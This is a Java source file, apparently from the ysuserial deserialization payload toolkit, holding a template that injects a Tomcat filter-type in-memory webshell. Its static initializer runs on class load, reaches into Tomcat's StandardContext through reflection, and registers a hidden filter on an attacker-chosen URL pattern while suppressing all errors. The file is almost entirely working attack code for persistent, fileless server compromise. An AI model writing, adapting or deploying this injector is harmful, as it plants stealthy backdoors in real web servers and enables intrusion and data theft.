package org.su18.ysuserial.payloads.templates.memshell.tomcat;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

/**
 * 使用线程注入 Tomcat Filter 型内存马
 */
public class TFMSFromThread implements Filter {

	public static String pattern;

	public static String NAME;

	static {
		try {
			WebappClassLoaderBase webappClassLoaderBase =
					(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

			StandardContext standardContext;

			try {
				standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
			} catch (Exception ignored) {
				Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
				field.setAccessible(true);
				Object root   = field.get(webappClassLoaderBase);
				Field  field2 = root.getClass().getDeclaredField("context");
				field2.setAccessible(true);

				standardContext = (StandardContext) field2.get(root);
			}

			Class<? extends StandardContext> aClass = null;
			try {
				aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
				aClass.getDeclaredField("filterConfigs");
			} catch (Exception e) {
				aClass = standardContext.getClass();
				aClass.getDeclaredField("filterConfigs");
			}
			Field Configs = aClass.getDeclaredField("filterConfigs");
			Configs.setAccessible(true);
			Map filterConfigs = (Map) Configs.get(standardContext);

			TFMSFromThread behinderFilter = new TFMSFromThread();

			FilterDef filterDef = new FilterDef();
			filterDef.setFilter(behinderFilter);
			filterDef.setFilterName(NAME);
			filterDef.setFilterClass(behinderFilter.getClass().getName());

			standardContext.addFilterDef(filterDef);

			FilterMap filterMap = new FilterMap();
			filterMap.addURLPattern(pattern);
			filterMap.setFilterName(NAME);
			filterMap.setDispatcher(DispatcherType.REQUEST.name());

			standardContext.addFilterMapBefore(filterMap);

			Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
			constructor.setAccessible(true);
			ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

			filterConfigs.put(NAME, filterConfig);
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(FilterConfig filterConfig) throws ServletException {
	}

	@Override
	public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
	}

	@Override
	public void destroy() {
	}
}